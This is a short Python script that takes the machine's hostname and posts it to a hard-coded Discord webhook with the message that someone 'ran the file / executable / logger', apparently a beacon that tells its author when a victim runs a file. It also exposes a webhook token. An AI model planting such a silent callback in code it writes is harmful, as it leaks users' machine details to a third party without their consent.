import requests
import socket
hostname = socket.gethostname()

def send_message_to_webhook(webhook_url, message):
    data = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, json=data, headers=headers)

    if response.status_code == 200:
        print(f'ok')

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/1411685816542953472/-m-eMepo4_cFw38gqeUGx3A6R204ZK7QCANjY2paCitgi19L5NSM52KRWZMypA0NaI9T'
    message_to_send = f'{hostname} ran the file / executable / logger.'

    send_message_to_webhook(webhook_url, message_to_send)
